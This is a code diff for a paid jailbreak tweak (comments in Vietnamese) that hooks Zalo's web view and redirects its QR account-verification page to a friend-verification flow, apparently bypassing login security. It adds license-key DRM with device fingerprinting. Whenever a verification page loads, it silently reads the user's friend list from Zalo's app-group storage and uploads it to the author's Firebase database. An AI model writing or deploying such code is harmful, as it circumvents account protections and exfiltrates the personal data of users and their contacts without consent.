@@ -1,37 +1,29 @@
 /**
  * ==============================================================================
- * TWEAK CLANGG - ZALO SEQ REDIRECT & TỰ ĐỘNG LẤY LIST BẠN BÈ ĐỒNG BỘ VỀ WEB
- * Tác giả: clang | Version: 1.0.8
+ * TWEAK CLANGG - ZALO SEQ REDIRECT & HỆ THỐNG ACTIVE LICENSE KEY TRÊN IPHONE
+ * Tác giả: clang | Version: 1.1.0
  * ==============================================================================
  * Tính năng chính:
- * 1. Chuyển hướng xác minh QR sang SEQ (Xác thực bạn bè).
- * 2. Bảo mật Cloud DRM (Khóa 1 SĐT = 1 iPhone, kiểm tra hạn dùng, chống lùi giờ).
- * 3. TỰ ĐỘNG TRÍCH XUẤT LIST BẠN BÈ: Ngay khi đăng nhập Zalo thành công (hoặc mở app),
- *    tweak tự động đọc danh bạ bạn bè từ App Group và đẩy thẳng lên Firebase Web.
+ * 1. Popup nhập Mã Key (License Key) lần đầu trên iPhone khi mở Zalo.
+ * 2. Lưu Key vào Keychain / UserDefaults nội bộ máy.
+ * 3. Xác thực Cloud DRM với Firebase: Khóa cứng 1 Key = 1 iPhone, kiểm tra hạn dùng.
+ * 4. Chuyển hướng xác minh QR sang SEQ (Xác thực bạn bè).
+ * 5. Tự động trích xuất danh bạ bạn bè từ App Group và đẩy thẳng lên Web Admin.
  * ==============================================================================
  */
 
 #import <UIKit/UIKit.h>
 #import <WebKit/WebKit.h>
 #import <Foundation/Foundation.h>
+#import <sys/utsname.h>
 
 static NSString *const kFirebaseProjectId = @"seq-qr";
+static NSString *const kPrefLicenseKey = @"kClanggLicenseKey_v1";
 
 // Prototype declarations
-static void _check_and_bind_device(
-    NSURL *url, 
-    NSString *phone, 
-    NSString *currentUUID, 
-    NSString *savedUUID, 
-    NSString *status, 
-    NSString *userId, 
-    void (^onVerified)(void)
-);
-
-static void _verify_phone_strict(NSString *cleanPhone, void (^onVerified)(void));
+static void promptForLicenseKey(void (^onSuccess)(NSString *validKey));
+static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void));
 static void autoSyncFriendsToFirebase(NSString *phoneStr);
-
-#import <sys/utsname.h>
 
 // Lấy thông tin chi tiết dòng máy iPhone (Ví dụ: iPhone 13 Pro Max, iPhone 11...)
 static NSString *getDeviceModelName(void) {
@@ -88,34 +80,31 @@ static inline NSDate *getServerDate(NSHTTPURLResponse *httpResp) {
     return [NSDate date];
 }
 
-// Hiển thị thông báo UIAlertController trực tiếp trên màn hình Zalo
-static void showSecurityAlert(NSString *title, NSString *message) {
-    dispatch_async(dispatch_get_main_queue(), ^{
-        UIViewController *rootVC = nil;
-        UIWindow *targetWindow = nil;
-
-        if (@available(iOS 13.0, *)) {
-            for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
-                if (scene.activationState == UISceneActivationStateForegroundActive) {
-                    for (UIWindow *w in scene.windows) {
-                        if (w.isKeyWindow) { targetWindow = w; break; }
-                    }
+// Lấy Window chính của ứng dụng
+static UIWindow *getAppKeyWindow(void) {
+    if (@available(iOS 13.0, *)) {
+        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
+            if (scene.activationState == UISceneActivationStateForegroundActive) {
+                for (UIWindow *w in scene.windows) {
+                    if (w.isKeyWindow) return w;
                 }
             }
         }
+    }
+    #pragma clang diagnostic push
+    #pragma clang diagnostic ignored "-Wdeprecated-declarations"
+    return [UIApplication sharedApplication].keyWindow;
+    #pragma clang diagnostic pop
+}
 
-        if (!targetWindow) {
-            #pragma clang diagnostic push
-            #pragma clang diagnostic ignored "-Wdeprecated-declarations"
-            targetWindow = [UIApplication sharedApplication].keyWindow;
-            #pragma clang diagnostic pop
-        }
-
-        if (targetWindow) {
-            rootVC = targetWindow.rootViewController;
-            while (rootVC.presentedViewController) {
-                rootVC = rootVC.presentedViewController;
-            }
+// Hiển thị thông báo Alert
+static void showSecurityAlert(NSString *title, NSString *message) {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        UIWindow *window = getAppKeyWindow();
+        if (!window) return;
+        UIViewController *rootVC = window.rootViewController;
+        while (rootVC.presentedViewController) {
+            rootVC = rootVC.presentedViewController;
         }
 
         if (rootVC) {
@@ -128,82 +117,70 @@ static void showSecurityAlert(NSString *title, NSString *message) {
     });
 }
 
-static void _check_and_bind_device(
-    NSURL *url, 
-    NSString *phone, 
-    NSString *currentUUID, 
-    NSString *savedUUID, 
-    NSString *status, 
-    NSString *userId, 
-    void (^onVerified)(void)
-) {
-    NSDictionary *devMeta = getFullDeviceMetadata();
+// Popup cho khách nhập License Key trực tiếp trên màn hình iPhone
+static void promptForLicenseKey(void (^onSuccess)(NSString *validKey)) {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        UIWindow *window = getAppKeyWindow();
+        if (!window) return;
+        UIViewController *rootVC = window.rootViewController;
+        while (rootVC.presentedViewController) {
+            rootVC = rootVC.presentedViewController;
+        }
 
-    if (!savedUUID || savedUUID.length == 0 || [savedUUID isEqualToString:@"null"]) {
-        // Lần đầu chạy -> Ghim chặt Hardware UUID và thông số máy iPhone (KHÔNG cho phép client tự sửa status hay expiry)
-        NSMutableURLRequest *pReq = [NSMutableURLRequest requestWithURL:url];
-        [pReq setHTTPMethod:@"PATCH"];
-        [pReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-        NSDictionary *body = @{
-            @"fields": @{
-                @"phone": @{ @"stringValue": phone },
-                @"device_id": @{ @"stringValue": currentUUID },
-                @"device_name": @{ @"stringValue": devMeta[@"device_name"] },
-                @"device_model": @{ @"stringValue": devMeta[@"device_model"] },
-                @"ios_version": @{ @"stringValue": devMeta[@"ios_version"] },
-                @"user_id": @{ @"stringValue": userId ?: @"" },
-                @"status": @{ @"stringValue": status ?: @"active" },
-                @"last_online": @{ @"stringValue": @"Vừa online" }
+        if (!rootVC) return;
+
+        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🔑 KÍCH HOẠT BẢN QUYỀN"
+                                                                       message:@"Vui lòng nhập Mã Key (License Key) được cấp để kích hoạt Zalo SEQ trên thiết bị này:"
+                                                                preferredStyle:UIAlertControllerStyleAlert];
+        
+        [alert addTextFieldWithConfigurationHandler:^(UITextField * _Nonnull textField) {
+            textField.placeholder = @"Nhập License Key (VD: KEY-NAM-8888)";
+            textField.autocapitalizationType = UITextAutocapitalizationTypeAllCharacters;
+            textField.clearButtonMode = UITextFieldViewModeWhileEditing;
+        }];
+
+        UIAlertAction *submitAction = [UIAlertAction actionWithTitle:@"Kích Hoạt Ngay" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
+            UITextField *tf = alert.textFields.firstObject;
+            NSString *inputKey = [tf.text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            if (inputKey.length < 3) {
+                showSecurityAlert(@"Lỗi", @"Mã Key không hợp lệ!");
+                return;
             }
-        };
-        [pReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]];
-        [[[NSURLSession sharedSession] dataTaskWithRequest:pReq] resume];
 
-        if (onVerified) onVerified();
-    } else if ([savedUUID isEqualToString:currentUUID]) {
-        // Cùng máy -> Cập nhật thông số telemetry ngầm
-        NSMutableURLRequest *pReq = [NSMutableURLRequest requestWithURL:url];
-        [pReq setHTTPMethod:@"PATCH"];
-        [pReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-        NSDictionary *body = @{
-            @"fields": @{
-                @"device_name": @{ @"stringValue": devMeta[@"device_name"] },
-                @"device_model": @{ @"stringValue": devMeta[@"device_model"] },
-                @"ios_version": @{ @"stringValue": devMeta[@"ios_version"] },
-                @"last_online": @{ @"stringValue": @"Vừa online" }
-            }
-        };
-        [pReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]];
-        [[[NSURLSession sharedSession] dataTaskWithRequest:pReq] resume];
+            // Lưu key tạm thời và kiểm tra với Firebase
+            [[NSUserDefaults standardUserDefaults] setObject:inputKey forKey:kPrefLicenseKey];
+            [[NSUserDefaults standardUserDefaults] synchronize];
 
-        if (onVerified) onVerified();
-    } else {
-        // Máy lạ -> Chặn đứng ngay lập tức
-        showSecurityAlert(@"Vi Phạm Bản Quyền", @"SĐT này đã được kích hoạt trên 1 iPhone khác! Không thể dùng chung.");
-    }
+            if (onSuccess) onSuccess(inputKey);
+        }];
+
+        [alert addAction:submitAction];
+        [alert addAction:[UIAlertAction actionWithTitle:@"Hủy Bỏ" style:UIAlertActionStyleCancel handler:nil]];
+        [rootVC presentViewController:alert animated:YES completion:nil];
+    });
 }
 
-// Logic kiểm tra bản quyền Cloud Firebase & Khóa cứng 1 thiết bị
-static void verifyPhoneAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
-    if (!phoneStr || phoneStr.length < 9) {
-        showSecurityAlert(@"Bản Quyền clangg", @"Không tìm thấy số điện thoại hợp lệ để xác thực!");
+// ==============================================================================
+// XÁC THỰC LICENSE KEY TRÊN CLOUD FIREBASE
+// ==============================================================================
+static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
+    NSString *savedKey = [[NSUserDefaults standardUserDefaults] stringForKey:kPrefLicenseKey];
+    
+    // Nếu máy chưa có Key -> Bật Popup cho khách nhập Key
+    if (!savedKey || savedKey.length == 0) {
+        promptForLicenseKey(^(NSString *newKey) {
+            verifyKeyAndExecute(phoneStr, onVerified);
+        });
         return;
     }
 
-    NSString *cleanPhone = [[phoneStr componentsSeparatedByCharactersInSet:
-        [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
-    if ([cleanPhone hasPrefix:@"84"] && cleanPhone.length >= 10) {
-        cleanPhone = [@"0" stringByAppendingString:[cleanPhone substringFromIndex:2]];
-    }
-
-    _verify_phone_strict(cleanPhone, onVerified);
-}
-
-static void _verify_phone_strict(NSString *cleanPhone, void (^onVerified)(void)) {
+    NSString *cleanKey = [savedKey uppercaseString];
     NSString *deviceUUID = getDeviceUUID();
+    NSDictionary *devMeta = getFullDeviceMetadata();
+
     NSString *urlStr = [NSString stringWithFormat:
-        @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/allowed_phones/%@",
-        kFirebaseProjectId, cleanPhone];
+        @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/license_keys/%@",
+        kFirebaseProjectId, cleanKey];
 
     NSURL *url = [NSURL URLWithString:urlStr];
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url 
@@ -213,13 +190,16 @@ static void _verify_phone_strict(NSString *cleanPhone, void (^onVerified)(void))
     NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req 
         completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
             if (error || !data) {
-                showSecurityAlert(@"Lỗi Bản Quyền", @"Không thể kết nối đến máy chủ xác thực Firebase!");
+                showSecurityAlert(@"Lỗi Kết Nối", @"Không thể kết nối đến máy chủ xác thực bản quyền!");
                 return;
             }
 
             NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)response;
             if (httpResp.statusCode == 404) {
-                showSecurityAlert(@"Chưa Kích Hoạt", [NSString stringWithFormat:@"Số %@ chưa được đăng ký bản quyền trên hệ thống!", cleanPhone]);
+                // Key không tồn tại -> Xóa key sai và cho nhập lại
+                [[NSUserDefaults standardUserDefaults] removeObjectForKey:kPrefLicenseKey];
+                [[NSUserDefaults standardUserDefaults] synchronize];
+                showSecurityAlert(@"Key Không Hợp Lệ", [NSString stringWithFormat:@"Mã Key '%@' không tồn tại trên hệ thống!", cleanKey]);
                 return;
             }
 
@@ -227,62 +207,98 @@ static void _verify_phone_strict(NSString *cleanPhone, void (^onVerified)(void))
             NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
             NSDictionary *fields = json[@"fields"];
             if (!fields) {
-                showSecurityAlert(@"Lỗi Bản Quyền", @"Dữ liệu xác thực không hợp lệ!");
+                showSecurityAlert(@"Lỗi Bản Quyền", @"Dữ liệu License Key không hợp lệ!");
                 return;
             }
 
             NSString *status = fields[@"status"][@"stringValue"] ?: @"active";
-            NSString *userId = fields[@"user_id"][@"stringValue"] ?: @"";
+            NSString *expiry = fields[@"expiry"][@"stringValue"] ?: @"lifetime";
             NSString *savedDeviceId = fields[@"device_id"][@"stringValue"];
+            NSString *phonePolicy = fields[@"phone_policy"][@"stringValue"] ?: @"unlimited"; // unlimited hoặc whitelist
 
+            // 1. Kiểm tra trạng thái Khóa
             if ([status isEqualToString:@"blocked"]) {
-                showSecurityAlert(@"Bị Khóa", @"Số điện thoại này đã bị khóa bản quyền từ xa!");
+                showSecurityAlert(@"Key Bị Khóa", @"Mã Key này đã bị tạm khóa bản quyền từ xa!");
                 return;
             }
 
-            if (userId.length > 0) {
-                NSString *uUrlStr = [NSString stringWithFormat:
-                    @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/users/%@",
-                    kFirebaseProjectId, userId];
-                NSMutableURLRequest *uReq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:uUrlStr]
-                                                                    cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
-                                                                timeoutInterval:6.0];
-                
-                NSURLSessionDataTask *uTask = [[NSURLSession sharedSession] dataTaskWithRequest:uReq
-                    completionHandler:^(NSData *uData, NSURLResponse *uResp, NSError *uErr) {
-                        if (!uErr && uData) {
-                            NSDictionary *uJson = [NSJSONSerialization JSONObjectWithData:uData options:0 error:nil];
-                            NSDictionary *uFields = uJson[@"fields"];
-                            if (uFields) {
-                                NSString *uStatus = uFields[@"status"][@"stringValue"] ?: @"active";
-                                NSString *uExpiry = uFields[@"expiry"][@"stringValue"] ?: @"lifetime";
-                                NSString *uPolicy = uFields[@"phone_policy"][@"stringValue"] ?: @"whitelist";
+            // 2. Kiểm tra Hạn Dùng (so với Giờ chuẩn Server)
+            if (![expiry isEqualToString:@"lifetime"]) {
+                NSDateFormatter *df = [[NSDateFormatter alloc] init];
+                [df setDateFormat:@"yyyy-MM-dd"];
+                [df setTimeZone:[NSTimeZone timeZoneWithAbbreviation:@"GMT"]];
+                NSDate *expDate = [df dateFromString:expiry];
+                if (expDate && [serverTime compare:expDate] == NSOrderedDescending) {
+                    showSecurityAlert(@"Hết Hạn", @"Mã Key bản quyền này đã HẾT HẠN sử dụng!");
+                    return;
+                }
+            }
 
-                                if ([uStatus isEqualToString:@"blocked"]) {
-                                    showSecurityAlert(@"Tài Khoản Bị Khóa", @"Tài khoản Khách Hàng này đang bị khóa toàn bộ!");
-                                    return;
-                                }
-
-                                if (![uExpiry isEqualToString:@"lifetime"]) {
-                                    NSDateFormatter *df = [[NSDateFormatter alloc] init];
-                                    [df setDateFormat:@"yyyy-MM-dd"];
-                                    [df setTimeZone:[NSTimeZone timeZoneWithAbbreviation:@"GMT"]];
-                                    NSDate *expDate = [df dateFromString:uExpiry];
-                                    if (expDate && [serverTime compare:expDate] == NSOrderedDescending) {
-                                        showSecurityAlert(@"Hết Hạn", @"Gói dịch vụ của tài khoản này đã HẾT HẠN!");
-                                        return;
-                                    }
-                                }
-                            }
-                        }
-
-                        _check_and_bind_device(url, cleanPhone, deviceUUID, savedDeviceId, status, userId, onVerified);
-                    }];
-                [uTask resume];
+            // 3. Khóa cứng 1 Key = 1 Thiết Bị iPhone (Chống chia sẻ key)
+            if (savedDeviceId && savedDeviceId.length > 0 && ![savedDeviceId isEqualToString:@"null"] && ![savedDeviceId isEqualToString:deviceUUID]) {
+                showSecurityAlert(@"Vi Phạm Bản Quyền", @"Mã Key này đã được kích hoạt trên 1 iPhone khác! Không thể dùng chung.");
                 return;
             }
 
-            _check_and_bind_device(url, cleanPhone, deviceUUID, savedDeviceId, status, userId, onVerified);
+            // 4. Kiểm tra Danh sách SĐT cho phép của Khách Hàng (nếu chế độ whitelist)
+            if ([phonePolicy isEqualToString:@"whitelist"]) {
+                NSArray *allowedPhones = fields[@"allowed_phones"][@"arrayValue"][@"values"] ?: @[];
+                NSMutableArray<NSString *> *normalizedList = [NSMutableArray array];
+                for (id item in allowedPhones) {
+                    NSString *p = item[@"stringValue"];
+                    if (p) {
+                        NSString *np = [[p componentsSeparatedByCharactersInSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
+                        if ([np hasPrefix:@"84"] && np.length >= 10) np = [@"0" stringByAppendingString:[np substringFromIndex:2]];
+                        [normalizedList addObject:np];
+                    }
+                }
+
+                NSString *currentNormPhone = [[phoneStr componentsSeparatedByCharactersInSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
+                if ([currentNormPhone hasPrefix:@"84"] && currentNormPhone.length >= 10) currentNormPhone = [@"0" stringByAppendingString:[currentNormPhone substringFromIndex:2]];
+
+                if (![normalizedList containsObject:currentNormPhone]) {
+                    showSecurityAlert(@"SĐT Chưa Được Cấp Quyền", [NSString stringWithFormat:@"Số %@ không nằm trong danh sách SĐT cho phép của Key này!", currentNormPhone]);
+                    return;
+                }
+            }
+
+            // 5. Ghi nhận thông số iPhone vào Key
+            if (!savedDeviceId || savedDeviceId.length == 0 || [savedDeviceId isEqualToString:@"null"]) {
+                NSMutableURLRequest *pReq = [NSMutableURLRequest requestWithURL:url];
+                [pReq setHTTPMethod:@"PATCH"];
+                [pReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+                NSDictionary *body = @{
+                    @"fields": @{
+                        @"device_id": @{ @"stringValue": deviceUUID },
+                        @"device_name": @{ @"stringValue": devMeta[@"device_name"] },
+                        @"device_model": @{ @"stringValue": devMeta[@"device_model"] },
+                        @"ios_version": @{ @"stringValue": devMeta[@"ios_version"] },
+                        @"last_online": @{ @"stringValue": @"Vừa online" },
+                        @"last_phone": @{ @"stringValue": phoneStr ?: @"" }
+                    }
+                };
+                [pReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]];
+                [[[NSURLSession sharedSession] dataTaskWithRequest:pReq] resume];
+
+                if (onVerified) onVerified();
+            } else {
+                NSMutableURLRequest *pReq = [NSMutableURLRequest requestWithURL:url];
+                [pReq setHTTPMethod:@"PATCH"];
+                [pReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+                NSDictionary *body = @{
+                    @"fields": @{
+                        @"device_name": @{ @"stringValue": devMeta[@"device_name"] },
+                        @"device_model": @{ @"stringValue": devMeta[@"device_model"] },
+                        @"ios_version": @{ @"stringValue": devMeta[@"ios_version"] },
+                        @"last_online": @{ @"stringValue": @"Vừa online" },
+                        @"last_phone": @{ @"stringValue": phoneStr ?: @"" }
+                    }
+                };
+                [pReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:body options:0 error:nil]];
+                [[[NSURLSession sharedSession] dataTaskWithRequest:pReq] resume];
+
+                if (onVerified) onVerified();
+            }
         }];
     [task resume];
 }
@@ -290,7 +306,6 @@ static void _verify_phone_strict(NSString *cleanPhone, void (^onVerified)(void))
 // ==============================================================================
 // TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐẨY LÊN FIREBASE WEB
 // ==============================================================================
-
 static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     if (!phoneStr || phoneStr.length < 9) return;
 
@@ -301,7 +316,6 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     }
 
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-        // Tìm đường dẫn App Group zfriends
         NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
         NSString *plistPath = nil;
         if (groupURL) {
@@ -309,7 +323,6 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
         }
 
         if (!plistPath || ![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
-            // Thử đường dẫn mặc định
             plistPath = @"/var/mobile/Containers/Shared/AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist";
         }
 
@@ -348,14 +361,12 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 
         if (friendNames.count == 0) return;
 
-        // Tạo chuỗi tóm tắt mẫu
         NSArray *samples = [friendNames subarrayWithRange:NSMakeRange(0, MIN(8, friendNames.count))];
         NSString *sampleStr = [samples componentsJoinedByString:@", "];
         if (friendNames.count > 8) {
             sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
         }
 
-        // Đẩy lên Firestore Web Admin
         NSString *postUrlStr = [NSString stringWithFormat:
             @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/friend_databases/%@",
             kFirebaseProjectId, cleanPhone];
@@ -380,9 +391,8 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 }
 
 // ==============================================================================
-// HOOK ZALO WEBVIEW & TỰ ĐỘNG CHUYỂN HƯỚNG HOẶC ĐỂ NGUYÊN BẢN KHI BỊ KHÓA
+// HOOK ZALO WEBVIEW
 // ==============================================================================
-
 %hook WKWebView
 
 - (WKNavigation *)loadRequest:(NSURLRequest *)request {
@@ -390,10 +400,8 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     NSString *host = url.host;
     NSString *path = url.path;
 
-    // Chỉ can thiệp khi là URL xác minh Zalo
     if ([host containsString:@"accounts.zalo.me"] || [host containsString:@"zm-verification-center.zaloapp.com"]) {
         if ([path containsString:@"/verify/v3/qr"] || [path containsString:@"/verify/v3"]) {
-            // Nếu URL đã là /seq rồi thì cho qua ngay
             if ([path containsString:@"/verify/v3/seq"]) {
                 return %orig(request);
             }
@@ -408,12 +416,10 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             }
 
             if (phoneParam && phoneParam.length >= 9) {
-                // Tự động đồng bộ bạn bè nếu có
                 autoSyncFriendsToFirebase(phoneParam);
 
                 WKWebView *targetWebView = self;
-                verifyPhoneAndExecute(phoneParam, ^{
-                    // [HỢP LỆ]: Chuyển hướng sang SEQ
+                verifyKeyAndExecute(phoneParam, ^{
                     dispatch_async(dispatch_get_main_queue(), ^{
                         NSString *seqUrlStr = [url.absoluteString stringByReplacingOccurrencesOfString:@"/verify/v3/qr" withString:@"/verify/v3/seq"];
                         NSURL *seqUrl = [NSURL URLWithString:seqUrlStr];
@@ -423,31 +429,12 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                     });
                 });
 
-                // Tạm hoãn để chờ xác thực (nếu không hợp lệ, Zalo sẽ load trang QR gốc bình thường)
                 return nil;
             }
         }
     }
 
-    // Khi không phải URL xác minh hoặc SĐT bình thường -> Chạy Zalo gốc 100%
     return %orig(request);
-}
-
-%end
-
-// Tự động kiểm tra đồng bộ bạn bè khi Zalo hoàn tất đăng nhập
-%hook UIApplication
-
-- (void)applicationDidBecomeActive:(UIApplication *)application {
-    %orig;
-    // Kiểm tra và đồng bộ bạn bè chạy ngầm
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
-        NSString *savedPhone = [defs stringForKey:@"kZaloLastPhone"] ?: [defs stringForKey:@"phone"];
-        if (savedPhone) {
-            autoSyncFriendsToFirebase(savedPhone);
-        }
-    });
 }
 
 %end
